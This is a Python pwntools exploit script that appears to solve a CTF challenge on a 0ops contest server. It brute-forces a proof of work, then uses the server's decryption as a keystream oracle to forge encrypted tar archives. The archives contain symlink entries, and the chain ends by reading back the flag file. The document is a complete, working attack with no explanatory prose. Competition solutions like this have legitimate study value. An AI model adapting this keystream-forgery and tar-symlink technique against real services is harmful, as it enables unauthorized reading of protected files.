#!/usr/bin/env python3

from pwn import *
import os
import tarfile
from hashlib import sha256
import string
import itertools

# Connect to the server
# r = remote('localhost', 10002)
r = remote('chall.ctf.0ops.sjtu.cn', 30001)

# Solve proof of work
print("solve proof of work")
r.recvuntil(b"a256(XXXX+")
suff = r.recvuntil(b")")[:-1].decode('latin-1')
r.recvuntil(b" == ")
target = r.recvuntil(b"\n")[:-1].decode('latin-1')
chars = string.ascii_letters+string.digits
for prefix in itertools.product(chars, repeat=4):
	prefix = "".join(prefix)
	# print(prefix)
	if sha256((prefix + suff).encode('latin-1')).hexdigest() == target:
		r.sendline(prefix.encode('latin-1'))
		break


# Add the flag
r.sendlineafter(b"> ", b"0")

# Grab the filename
r.recvuntil(b"[OK] ")
filename = r.recvuntil(b" added")[:-6]

# Let's make a tar file in a temporary directory
with tempfile.TemporaryDirectory() as tmpdir:
	# Make the tar file
	tarname = os.path.join(tmpdir, "a.tar")
	# Make a file in the directory
	with open(os.path.join(tmpdir, "x"), "wb") as f:
		f.write(b"hi")
	# Make a symlink in the directory
	os.symlink("y", os.path.join(tmpdir, "z"), True)
	with tarfile.open(tarname, "w") as tar:
		# Add the file to the tar with the filename we got from the server
		tar.add(os.path.join(tmpdir, "z"), arcname="sym")
		tar.add(os.path.join(tmpdir, "x"), arcname="sym/bar")
		tar.add(os.path.join(tmpdir, "x"), arcname=filename.decode('latin-1'))

	tarname2 = os.path.join(tmpdir, "b.tar")
	os.unlink(os.path.join(tmpdir, "z"))
	os.symlink("foo", os.path.join(tmpdir, "z"), True)
	with tarfile.open(tarname2, "w") as tar:
		tar.add(os.path.join(tmpdir, "z"), arcname="sym")
		tar.add(os.path.join(tmpdir, "x"), arcname="foo/bar")

	# Get the bytes of the tar file
	with open(tarname, "rb") as tar:
		tarbytes = tar.read()
	with open(tarname2, "rb") as tar:
		tarbytes2 = tar.read()

	# Save the tar file outside the temp dir
	with open("a.tar", "wb") as f:
		f.write(tarbytes)

# Make the server decrypt "00" * (8 + len(tarbytes))
print("make the server decrypt 00 * (8 + len(tarbytes))")
r.sendlineafter(b"> ", b"2")
r.sendlineafter(b"size: ", str(8 + len(tarbytes)).encode('latin-1'))
r.sendlineafter(b"file(hex): ", b"00" * (8 + len(tarbytes)))

# Get the decrypted bytes
print("get the decrypted bytes")
r.recvuntil(b"[Error] not tar file\n")
decrypted_hex = r.recvuntil(b"\n")[:-1]
decrypted = bytes.fromhex(decrypted_hex.decode('latin-1'))

# xor the decrypted bytes with the tar bytes to get encrypted bytes
print("xor the decrypted bytes with the tar bytes to get encrypted bytes")
encrypted = bytes([a ^ b for a, b in zip(decrypted, tarbytes)])
encrypted2 = bytes([a ^ b for a, b in zip(decrypted, tarbytes2)])

# upload it
print("upload it")
r.sendlineafter(b"> ", b"2")
r.sendlineafter(b"size: ", str(8 + len(encrypted)).encode('latin-1'))
r.sendlineafter(b"file(hex): ", b"00" * 8 + encrypted.hex().encode('latin-1'))

print("upload it 2")
r.sendlineafter(b"> ", b"2")
r.sendlineafter(b"size: ", str(8 + len(encrypted2)).encode('latin-1'))
r.sendlineafter(b"file(hex): ", b"00" * 8 + encrypted2.hex().encode('latin-1'))

# download it
print("download it")
# r.interactive()
r.sendlineafter(b"> ", b"4")
r.recvuntil(b"[OK] ")
r.recvuntil(b"\n")
hexdata = r.recvuntil(b"\n")[:-1]
gooddata = bytes.fromhex(hexdata.decode('latin-1'))
betterdata = gooddata[:8] + bytes([a ^ 0xcc for a in gooddata[8:]])

# upload that
print("upload that")
r.sendlineafter(b"> ", b"2")
r.sendlineafter(b"size: ", str(len(betterdata)).encode('latin-1'))
r.sendlineafter(b"file(hex): ", betterdata.hex().encode('latin-1'))

# pls give flag
print("pls give flag")
r.recvuntil(b"[Error] not tar file\n")
maybe_flag_tar_hex = r.recvuntil(b"\n")[:-1]
print(maybe_flag_tar_hex)
maybe_flag_tar = bytes.fromhex(maybe_flag_tar_hex.decode('latin-1'))
maybe_flag_tar = bytes([a ^ 0xcc for a in maybe_flag_tar])

with open("maybe_flag.tar", "wb") as f:
	f.write(maybe_flag_tar)

with tarfile.open("maybe_flag.tar") as f:
	# open the flag file
	flagfile = f.extractfile(filename.decode('latin-1'))
	# read the flag file
	flag = flagfile.read()
	print("flag:", flag)
# print("flage???", maybe_flag)

r.interactive()